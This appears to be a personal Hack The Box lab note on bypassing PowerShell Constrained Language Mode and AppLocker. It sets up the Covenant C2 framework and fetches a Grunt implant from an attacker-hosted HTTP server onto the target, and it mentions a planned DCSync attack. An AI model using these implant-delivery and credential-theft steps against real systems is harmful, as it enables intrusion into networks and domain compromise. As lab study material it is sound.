
```
 $ExecutionContext.SessionState.LanguageMode
```
![[Pasted image 20240411235342.png]]

```
Constrained Language Mode
```

So let's see how to bypass it to get the full access.

So if a group policy is restricting us from executing a program will simply bypass it using AppLocker bypass list.

https://github.com/api0cradle/UltimateAppLockerByPassList

![[Pasted image 20240412082454.png]]

Always keep in mind that in these situation these location are whitelisted means we might have write permissions in this.
```
C:\Windows\Temp
```


Will install a C2 framework (i.e. [Covenant](https://github.com/cobbr/Covenant))
Clone the repository
```
git clone --recurse-submodules https://github.com/cobbr/Covenant
```

```
cd Covenant/Covenant
```

```
 docker build -t covenant .
```

I don't have docker so we have to install it as well

```
sudo apt install docker.io
```

```
sudo apt install docker-compose
```

![[Pasted image 20240412091251.png]]

```
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $(pwd)/Data:/app/Data covenant --username singh
```

```
testing123
```

![[Pasted image 20240412101938.png]]

We have installed Convenant in no time with the help of docker.

These both things are virtually the same (i.e. Covenant is server aspects and elite is the client that connects to the server)

I tried installing Elite but it's deprecated Temporarily.

```
docker ps -a
```

```
docker rm covenant
```


![[Pasted image 20240429211001.png]]

Will go in Launchers and select Binary
![[Pasted image 20240429211101.png]]

Will click on generate
![[Pasted image 20240429211518.png]]

Will Login to the PS shell and will upload our luncher file and try to run it and see if we get a connection or not.

I simply hosted a python3 server and downloaded the file simply
```
 python3 -m http.server 8080
```
![[Pasted image 20240429212547.png]]

```
IWR -Uri http://10.10.16.20:8080/GruntHTTP.exe -OutFile pleasesub.exe
```
![[Pasted image 20240429212509.png]]

Grunt
```
help
```
![[Pasted image 20240429212708.png]]

We have different commands like Rubeus , Seat Belt
![[Pasted image 20240429212821.png]]

Will simply see the video as we already how to run bloodhound and see things as we are getting with our but learnt the method

![[Pasted image 20240501014332.png]]

![[Pasted image 20240501014433.png]]

As we have both the rights we can simply attempt DCSync attack.

```
MRLKY@HTB.LOCAL
```
